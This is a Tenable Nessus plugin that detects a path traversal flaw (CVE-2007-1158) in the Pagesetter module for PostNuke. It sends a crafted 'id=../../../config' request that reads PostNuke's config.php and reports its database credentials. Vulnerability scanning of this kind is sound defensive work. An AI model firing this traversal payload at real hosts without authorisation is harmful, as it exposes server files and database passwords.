#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24713);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2007-1158");
  script_bugtraq_id(22733);
  script_xref(name:"OSVDB", value:"33781");

  script_name(english:"Pagesetter for PostNuke index.php id Parameter Traversal Arbitrary File Access");
  script_summary(english:"Tries to read a local file with Pagesetter");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The third-party Pagesetter module for PostNuke installed on the remote
host fails to sanitize input to the 'id' parameter before using it to
display a file in the function 'pagesetter_file_preview()' of the
script 'pnfile.php'.  An unauthenticated attacker can exploit this
issue to view arbitrary files on the remote host, subject to the
privileges of the web server user id." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/461339/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.elfisk.dk/index.php?module=pagesetter&func=viewpub&tid=7&pid=125" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Pagesetter version 6.3.0 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("postnuke_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/postnuke"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to retrieve a local file.
  r = http_send_recv3(method:"GET", port:port,
    item:string(
      dir, "/index.php?",
      "module=Pagesetter&",
      "type=file&",
      "func=preview&",
      # nb: together, these two parameters should give us PostNuke's config.php
      #     if the install is vulnerable.
      "id=../../../config&",
      "field=php"
    ));
  if (isnull(r)) exit(0);
  res = strcat(r[0], r[1], '\r\n', r[2]);

  # There's a problem if...
  if (
    # if looks like a preview and...
    'inline; filename="preview"' >< res &&
    # it looks like PostNuke's config file.
    "$pnconfig[" >< res &&
    egrep(pattern:"\$pnconfig\[.*db(type|uname|pass|name)", string:res)
  )
  {
    res = strstr(res, "<?");
    report = string(
      "Here are the contents of PostNuke's config file that Nessus was\n",
      "able to read from the remote host :\n",
      "\n",
      res
    );

    security_warning(port:port, extra:report);
    exit(0);
  }
}
